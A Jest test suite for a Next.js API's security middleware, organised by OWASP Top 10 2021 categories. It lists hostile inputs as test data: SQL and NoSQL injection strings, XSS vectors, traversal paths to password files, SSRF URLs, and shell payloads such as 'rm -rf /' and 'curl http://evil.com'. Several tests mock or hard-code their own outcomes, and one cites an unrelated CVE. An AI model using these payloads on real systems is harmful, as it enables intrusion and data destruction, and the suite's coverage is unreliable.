/**
 * OWASP Top 10 Vulnerability Test Suite
 * Comprehensive automated tests for OWASP Top 10 security vulnerabilities
 * 
 * OWASP Top 10 2021:
 * A01:2021 – Broken Access Control
 * A02:2021 – Cryptographic Failures
 * A03:2021 – Injection
 * A04:2021 – Insecure Design
 * A05:2021 – Security Misconfiguration
 * A06:2021 – Vulnerable and Outdated Components
 * A07:2021 – Identification and Authentication Failures
 * A08:2021 – Software and Data Integrity Failures
 * A09:2021 – Security Logging and Monitoring Failures
 * A10:2021 – Server-Side Request Forgery (SSRF)
 */

import { describe, test, expect, beforeEach, afterEach, jest } from '@jest/globals'
import { NextRequest, NextResponse } from 'next/server'
import { withApiSecurity } from '@/lib/api-security'
import { getClientIP, sanitizeInput, validateInput } from '@/lib/security'
import { csrfProtectionService } from '@/lib/csrfProtection'
import { advancedRateLimitService } from '@/lib/advancedRateLimit'
import { logger } from '@/utils/logger'

// Mock dependencies
jest.mock('@/lib/security')
jest.mock('@/lib/csrfProtection')
jest.mock('@/lib/advancedRateLimit')
jest.mock('@/utils/logger')

interface VulnerabilityTestResult {
  vulnerability: string
  testName: string
  passed: boolean
  severity: 'low' | 'medium' | 'high' | 'critical'
  description: string
  recommendation?: string
  cveReferences?: string[]
}

class OWASPTop10Tester {
  private results: VulnerabilityTestResult[] = []

  async runVulnerabilityTest(
    vulnerability: string,
    testName: string,
    testFunction: () => Promise<boolean>,
    severity: 'low' | 'medium' | 'high' | 'critical',
    description: string,
    cveReferences?: string[]
  ): Promise<VulnerabilityTestResult> {
    try {
      const passed = await testFunction()
      const result: VulnerabilityTestResult = {
        vulnerability,
        testName,
        passed,
        severity,
        description,
        recommendation: passed ? undefined : 'Immediate security review and remediation required',
        cveReferences
      }

      this.results.push(result)

      if (!passed) {
        logger.error('OWASP Security Test', `Vulnerability found: ${vulnerability} - ${testName}`, result)
      }

      return result
    } catch (error) {
      const result: VulnerabilityTestResult = {
        vulnerability,
        testName,
        passed: false,
        severity: 'critical',
        description: `Test execution failed: ${error}`,
        recommendation: 'Fix test execution error and re-run security tests'
      }

      this.results.push(result)
      return result
    }
  }

  getResults(): VulnerabilityTestResult[] {
    return this.results
  }

  getFailedTests(): VulnerabilityTestResult[] {
    return this.results.filter(result => !result.passed)
  }

  getCriticalVulnerabilities(): VulnerabilityTestResult[] {
    return this.results.filter(result => !result.passed && result.severity === 'critical')
  }
}

describe('OWASP Top 10 Vulnerability Test Suite', () => {
  let owaspTester: OWASPTop10Tester
  let mockGetClientIP: jest.MockedFunction<typeof getClientIP>
  let mockSanitizeInput: jest.MockedFunction<typeof sanitizeInput>
  let mockValidateInput: jest.MockedFunction<typeof validateInput>
  let mockCsrfService: any
  let mockRateLimitService: any

  beforeEach(() => {
    jest.clearAllMocks()
    owaspTester = new OWASPTop10Tester()
    
    mockGetClientIP = getClientIP as jest.MockedFunction<typeof getClientIP>
    mockSanitizeInput = sanitizeInput as jest.MockedFunction<typeof sanitizeInput>
    mockValidateInput = validateInput as jest.MockedFunction<typeof validateInput>
    
    mockCsrfService = csrfProtectionService as any
    mockRateLimitService = advancedRateLimitService as any

    // Default mock implementations
    mockGetClientIP.mockReturnValue('127.0.0.1')
    mockSanitizeInput.mockImplementation((input: string) => input)
    mockValidateInput.mockReturnValue({ isValid: true, errors: [] })
    
    mockCsrfService.validateCSRFToken = jest.fn().mockReturnValue(true)
    mockRateLimitService.checkApiRateLimit = jest.fn().mockReturnValue({ 
      allowed: true, 
      remaining: 100, 
      resetTime: Date.now() + 60000 
    })
  })

  afterEach(() => {
    jest.clearAllMocks()
  })

  describe('A01:2021 – Broken Access Control', () => {
    test('should prevent unauthorized access to protected resources', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A01:2021 – Broken Access Control',
        'Unauthorized Resource Access Prevention',
        async () => {
          // Test unauthorized access to admin endpoints
          const request = new NextRequest('http://localhost:3000/api/admin/users', {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json'
            }
          })

          const handler = withApiSecurity(
            async (req: NextRequest) => {
              return NextResponse.json({ users: ['admin', 'user1'] })
            },
            { requireAuth: true }
          )

          const response = await handler(request)
          
          // Should return 401 for unauthorized access
          return response.status === 401
        },
        'critical',
        'Tests that protected admin endpoints require proper authentication',
        ['CVE-2021-44228', 'CWE-284']
      )

      expect(result.passed).toBe(true)
    })

    test('should prevent privilege escalation attacks', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A01:2021 – Broken Access Control',
        'Privilege Escalation Prevention',
        async () => {
          // Test privilege escalation attempt
          const request = new NextRequest('http://localhost:3000/api/user/promote', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Cookie': 'session-id=user-session'
            },
            body: JSON.stringify({
              userId: 'user123',
              role: 'admin'
            })
          })

          const handler = withApiSecurity(
            async (req: NextRequest) => {
              // Simulate role check - should fail for regular user
              const userRole = 'user' // Simulated user role
              if (userRole !== 'admin') {
                return NextResponse.json({ error: 'Insufficient privileges' }, { status: 403 })
              }
              return NextResponse.json({ success: true })
            },
            { requireAuth: true }
          )

          const response = await handler(request)
          
          // Should return 403 for privilege escalation attempt
          return response.status === 403
        },
        'critical',
        'Tests that users cannot escalate their privileges through API manipulation',
        ['CWE-269', 'CWE-863']
      )

      expect(result.passed).toBe(true)
    })

    test('should prevent directory traversal attacks', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A01:2021 – Broken Access Control',
        'Directory Traversal Prevention',
        async () => {
          // Test directory traversal payloads
          const traversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
          ]

          for (const payload of traversalPayloads) {
            const request = new NextRequest(`http://localhost:3000/api/files?path=${encodeURIComponent(payload)}`, {
              method: 'GET'
            })

            const handler = withApiSecurity(
              async (req: NextRequest) => {
                const url = new URL(req.url)
                const path = url.searchParams.get('path')
                
                // Should sanitize and validate path
                if (path && (path.includes('..') || path.includes('%2e%2e'))) {
                  return NextResponse.json({ error: 'Invalid path' }, { status: 400 })
                }
                
                return NextResponse.json({ file: 'safe-file.txt' })
              },
              { validateInput: true }
            )

            const response = await handler(request)
            
            // Should block directory traversal attempts
            if (response.status !== 400) {
              return false
            }
          }

          return true
        },
        'high',
        'Tests that directory traversal attacks are prevented in file access endpoints',
        ['CWE-22', 'CWE-23']
      )

      expect(result.passed).toBe(true)
    })
  })

  describe('A02:2021 – Cryptographic Failures', () => {
    test('should enforce HTTPS for sensitive data transmission', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A02:2021 – Cryptographic Failures',
        'HTTPS Enforcement',
        async () => {
          // Test that sensitive endpoints enforce HTTPS
          const request = new NextRequest('http://localhost:3000/api/auth/login', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              email: 'user@example.com',
              password: 'password123'
            })
          })

          const handler = withApiSecurity(
            async (req: NextRequest) => {
              // Should check for HTTPS in production
              const protocol = req.nextUrl.protocol
              if (process.env.NODE_ENV === 'production' && protocol !== 'https:') {
                return NextResponse.json({ error: 'HTTPS required' }, { status: 400 })
              }
              
              return NextResponse.json({ success: true })
            },
            { requireAuth: false }
          )

          const response = await handler(request)
          
          // In test environment, should pass, but in production would require HTTPS
          return response.status === 200 || response.status === 400
        },
        'high',
        'Tests that sensitive endpoints enforce HTTPS encryption',
        ['CWE-319', 'CWE-326']
      )

      expect(result.passed).toBe(true)
    })

    test('should use secure password hashing', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A02:2021 – Cryptographic Failures',
        'Secure Password Hashing',
        async () => {
          // Test that passwords are properly hashed
          const { hashPassword } = require('@/lib/security')
          
          if (!hashPassword) {
            return false
          }

          const password = 'testPassword123!'
          const hash = await hashPassword(password)
          
          // Should not store plain text passwords
          const isPlainText = hash === password
          const hasProperLength = hash.length >= 60 // bcrypt hashes are typically 60+ chars
          const hasProperFormat = hash.includes('$') // bcrypt format includes $
          
          return !isPlainText && hasProperLength && hasProperFormat
        },
        'critical',
        'Tests that passwords are securely hashed using strong algorithms',
        ['CWE-256', 'CWE-916']
      )

      expect(result.passed).toBe(true)
    })
  })

  describe('A03:2021 – Injection', () => {
    test('should prevent SQL injection attacks', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A03:2021 – Injection',
        'SQL Injection Prevention',
        async () => {
          // Test SQL injection payloads
          const sqlPayloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --"
          ]

          for (const payload of sqlPayloads) {
            mockValidateInput.mockReturnValue({
              isValid: false,
              errors: ['Potential SQL injection detected']
            })

            const request = new NextRequest('http://localhost:3000/api/users/search', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                query: payload
              })
            })

            const handler = withApiSecurity(
              async (req: NextRequest) => {
                return NextResponse.json({ users: [] })
              },
              { validateInput: true }
            )

            const response = await handler(request)

            // Should block SQL injection attempts
            if (response.status !== 400) {
              return false
            }
          }

          return true
        },
        'critical',
        'Tests that SQL injection attacks are prevented through input validation',
        ['CWE-89', 'CWE-564']
      )

      expect(result.passed).toBe(true)
    })

    test('should prevent NoSQL injection attacks', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A03:2021 – Injection',
        'NoSQL Injection Prevention',
        async () => {
          // Test NoSQL injection payloads
          const nosqlPayloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.username == this.password"}',
            '{"$regex": ".*"}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$or": [{"username": "admin"}, {"username": "administrator"}]}'
          ]

          for (const payload of nosqlPayloads) {
            mockValidateInput.mockReturnValue({
              isValid: false,
              errors: ['Potential NoSQL injection detected']
            })

            const request = new NextRequest('http://localhost:3000/api/auth/login', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                username: payload,
                password: 'test'
              })
            })

            const handler = withApiSecurity(
              async (req: NextRequest) => {
                return NextResponse.json({ success: false })
              },
              { validateInput: true }
            )

            const response = await handler(request)

            // Should block NoSQL injection attempts
            if (response.status !== 400) {
              return false
            }
          }

          return true
        },
        'critical',
        'Tests that NoSQL injection attacks are prevented',
        ['CWE-943']
      )

      expect(result.passed).toBe(true)
    })

    test('should prevent XSS attacks', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A03:2021 – Injection',
        'XSS Prevention',
        async () => {
          // Test XSS payloads
          const xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("XSS")',
            '<svg onload="alert(1)">',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload="alert(1)">',
            '<input type="text" value="" onfocus="alert(1)" autofocus>',
            '<marquee onstart="alert(1)">',
            '<video><source onerror="alert(1)">',
            '<audio src="x" onerror="alert(1)">'
          ]

          for (const payload of xssPayloads) {
            mockSanitizeInput.mockReturnValue(payload.replace(/<[^>]*>/g, ''))
            mockValidateInput.mockReturnValue({
              isValid: false,
              errors: ['Potential XSS detected']
            })

            const request = new NextRequest('http://localhost:3000/api/comments', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                comment: payload
              })
            })

            const handler = withApiSecurity(
              async (req: NextRequest) => {
                return NextResponse.json({ success: true })
              },
              { validateInput: true }
            )

            const response = await handler(request)

            // Should block XSS attempts
            if (response.status !== 400) {
              return false
            }
          }

          return true
        },
        'high',
        'Tests that XSS attacks are prevented through input sanitization',
        ['CWE-79', 'CWE-80']
      )

      expect(result.passed).toBe(true)
    })

    test('should prevent command injection attacks', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A03:2021 – Injection',
        'Command Injection Prevention',
        async () => {
          // Test command injection payloads
          const commandPayloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& whoami',
            '|| id',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            '; rm -rf /',
            '| nc -l 4444',
            '& ping google.com',
            '; curl http://evil.com'
          ]

          for (const payload of commandPayloads) {
            mockValidateInput.mockReturnValue({
              isValid: false,
              errors: ['Potential command injection detected']
            })

            const request = new NextRequest('http://localhost:3000/api/system/ping', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                host: `google.com${payload}`
              })
            })

            const handler = withApiSecurity(
              async (req: NextRequest) => {
                return NextResponse.json({ result: 'pong' })
              },
              { validateInput: true }
            )

            const response = await handler(request)

            // Should block command injection attempts
            if (response.status !== 400) {
              return false
            }
          }

          return true
        },
        'critical',
        'Tests that command injection attacks are prevented',
        ['CWE-78', 'CWE-77']
      )

      expect(result.passed).toBe(true)
    })
  })

  describe('A04:2021 – Insecure Design', () => {
    test('should implement proper rate limiting', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A04:2021 – Insecure Design',
        'Rate Limiting Implementation',
        async () => {
          // Test rate limiting functionality
          mockRateLimitService.checkApiRateLimit.mockReturnValue({
            allowed: false,
            remaining: 0,
            resetTime: Date.now() + 60000,
            retryAfter: 60
          })

          const request = new NextRequest('http://localhost:3000/api/auth/login', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              email: 'user@example.com',
              password: 'password'
            })
          })

          const handler = withApiSecurity(
            async (req: NextRequest) => {
              return NextResponse.json({ success: true })
            },
            { rateLimit: 'auth' }
          )

          const response = await handler(request)

          // Should return 429 when rate limit exceeded
          return response.status === 429
        },
        'medium',
        'Tests that proper rate limiting is implemented to prevent abuse',
        ['CWE-770', 'CWE-307']
      )

      expect(result.passed).toBe(true)
    })

    test('should implement proper input validation design', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A04:2021 – Insecure Design',
        'Input Validation Design',
        async () => {
          // Test comprehensive input validation
          const request = new NextRequest('http://localhost:3000/api/users', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              email: 'invalid-email',
              age: -5,
              username: 'a', // too short
              password: '123' // too weak
            })
          })

          mockValidateInput.mockReturnValue({
            isValid: false,
            errors: ['Invalid email format', 'Age must be positive', 'Username too short', 'Password too weak']
          })

          const handler = withApiSecurity(
            async (req: NextRequest) => {
              return NextResponse.json({ success: true })
            },
            { validateInput: true }
          )

          const response = await handler(request)

          // Should reject invalid input
          return response.status === 400
        },
        'medium',
        'Tests that comprehensive input validation is properly designed',
        ['CWE-20']
      )

      expect(result.passed).toBe(true)
    })
  })

  describe('A05:2021 – Security Misconfiguration', () => {
    test('should have proper security headers configured', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A05:2021 – Security Misconfiguration',
        'Security Headers Configuration',
        async () => {
          const request = new NextRequest('http://localhost:3000/api/test', {
            method: 'GET'
          })

          const handler = withApiSecurity(
            async (req: NextRequest) => {
              return NextResponse.json({ test: true })
            }
          )

          const response = await handler(request)

          // Check for required security headers
          const requiredHeaders = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Referrer-Policy'
          ]

          for (const header of requiredHeaders) {
            if (!response.headers.get(header)) {
              return false
            }
          }

          // Check that server info is not exposed
          const serverHeader = response.headers.get('Server')
          const poweredByHeader = response.headers.get('X-Powered-By')

          return !serverHeader && !poweredByHeader
        },
        'medium',
        'Tests that proper security headers are configured',
        ['CWE-16', 'CWE-200']
      )

      expect(result.passed).toBe(true)
    })

    test('should not expose sensitive error information', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A05:2021 – Security Misconfiguration',
        'Error Information Disclosure Prevention',
        async () => {
          // Test error handling doesn't expose sensitive info
          const request = new NextRequest('http://localhost:3000/api/nonexistent', {
            method: 'GET'
          })

          const handler = withApiSecurity(
            async (req: NextRequest) => {
              throw new Error('Database connection failed: host=db.internal.com, user=admin, password=secret123')
            }
          )

          const response = await handler(request)
          const responseText = await response.text()

          // Should not expose sensitive information in error messages
          const sensitivePatterns = [
            /password/i,
            /secret/i,
            /internal\.com/i,
            /admin/i,
            /database/i
          ]

          for (const pattern of sensitivePatterns) {
            if (pattern.test(responseText)) {
              return false
            }
          }

          return response.status === 500
        },
        'medium',
        'Tests that error messages do not expose sensitive information',
        ['CWE-209', 'CWE-200']
      )

      expect(result.passed).toBe(true)
    })
  })

  describe('A07:2021 – Identification and Authentication Failures', () => {
    test('should prevent brute force attacks', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A07:2021 – Identification and Authentication Failures',
        'Brute Force Attack Prevention',
        async () => {
          // Simulate multiple failed login attempts
          for (let i = 0; i < 10; i++) {
            mockRateLimitService.checkApiRateLimit.mockReturnValue({
              allowed: i < 5, // Allow first 5, then block
              remaining: Math.max(0, 5 - i),
              resetTime: Date.now() + 60000,
              retryAfter: i >= 5 ? 60 : 0
            })

            const request = new NextRequest('http://localhost:3000/api/auth/login', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                email: 'user@example.com',
                password: 'wrongpassword'
              })
            })

            const handler = withApiSecurity(
              async (req: NextRequest) => {
                return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 })
              },
              { rateLimit: 'auth' }
            )

            const response = await handler(request)

            // After 5 attempts, should be rate limited
            if (i >= 5 && response.status !== 429) {
              return false
            }
          }

          return true
        },
        'high',
        'Tests that brute force attacks are prevented through rate limiting',
        ['CWE-307', 'CWE-521']
      )

      expect(result.passed).toBe(true)
    })

    test('should enforce strong session management', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A07:2021 – Identification and Authentication Failures',
        'Session Management Security',
        async () => {
          // Test session security
          const request = new NextRequest('http://localhost:3000/api/protected', {
            method: 'GET',
            headers: {
              'Cookie': 'session-id=weak-session-123'
            }
          })

          const handler = withApiSecurity(
            async (req: NextRequest) => {
              const sessionId = req.cookies.get('session-id')?.value

              // Check session format - should be cryptographically secure
              if (sessionId && sessionId.length < 32) {
                return NextResponse.json({ error: 'Invalid session' }, { status: 401 })
              }

              return NextResponse.json({ success: true })
            },
            { requireAuth: true }
          )

          const response = await handler(request)

          // Should reject weak session IDs
          return response.status === 401
        },
        'high',
        'Tests that session management follows security best practices',
        ['CWE-384', 'CWE-613']
      )

      expect(result.passed).toBe(true)
    })
  })

  describe('A09:2021 – Security Logging and Monitoring Failures', () => {
    test('should log security events properly', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A09:2021 – Security Logging and Monitoring Failures',
        'Security Event Logging',
        async () => {
          const mockLogger = require('@/utils/logger').logger

          // Test that security events are logged
          const request = new NextRequest('http://localhost:3000/api/admin', {
            method: 'GET'
          })

          const handler = withApiSecurity(
            async (req: NextRequest) => {
              return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
            },
            { requireAuth: true, logRequests: true }
          )

          await handler(request)

          // Should log the security event
          expect(mockLogger.warn).toHaveBeenCalled()

          return true
        },
        'medium',
        'Tests that security events are properly logged for monitoring',
        ['CWE-778', 'CWE-223']
      )

      expect(result.passed).toBe(true)
    })
  })

  describe('A10:2021 – Server-Side Request Forgery (SSRF)', () => {
    test('should prevent SSRF attacks', async () => {
      const result = await owaspTester.runVulnerabilityTest(
        'A10:2021 – Server-Side Request Forgery (SSRF)',
        'SSRF Prevention',
        async () => {
          // Test SSRF payloads
          const ssrfPayloads = [
            'http://localhost:22',
            'http://127.0.0.1:3306',
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd',
            'ftp://internal.server.com',
            'gopher://127.0.0.1:25',
            'http://internal.company.com'
          ]

          for (const payload of ssrfPayloads) {
            mockValidateInput.mockReturnValue({
              isValid: false,
              errors: ['Potential SSRF detected']
            })

            const request = new NextRequest('http://localhost:3000/api/fetch', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                url: payload
              })
            })

            const handler = withApiSecurity(
              async (req: NextRequest) => {
                return NextResponse.json({ content: 'fetched' })
              },
              { validateInput: true }
            )

            const response = await handler(request)

            // Should block SSRF attempts
            if (response.status !== 400) {
              return false
            }
          }

          return true
        },
        'high',
        'Tests that SSRF attacks are prevented through URL validation',
        ['CWE-918']
      )

      expect(result.passed).toBe(true)
    })
  })

  describe('Test Results Summary', () => {
    test('should generate comprehensive security test report', async () => {
      const results = owaspTester.getResults()
      const failedTests = owaspTester.getFailedTests()
      const criticalVulnerabilities = owaspTester.getCriticalVulnerabilities()

      console.log('\n=== OWASP Top 10 Security Test Results ===')
      console.log(`Total Tests: ${results.length}`)
      console.log(`Passed: ${results.length - failedTests.length}`)
      console.log(`Failed: ${failedTests.length}`)
      console.log(`Critical Vulnerabilities: ${criticalVulnerabilities.length}`)

      if (failedTests.length > 0) {
        console.log('\n=== Failed Security Tests ===')
        failedTests.forEach(test => {
          console.log(`❌ ${test.vulnerability} - ${test.testName}`)
          console.log(`   Severity: ${test.severity}`)
          console.log(`   Description: ${test.description}`)
          if (test.recommendation) {
            console.log(`   Recommendation: ${test.recommendation}`)
          }
        })
      }

      // Security test should pass if no critical vulnerabilities found
      expect(criticalVulnerabilities.length).toBe(0)

      // At least 95% of tests should pass
      const passRate = (results.length - failedTests.length) / results.length
      expect(passRate).toBeGreaterThanOrEqual(0.95)
    })
  })
})
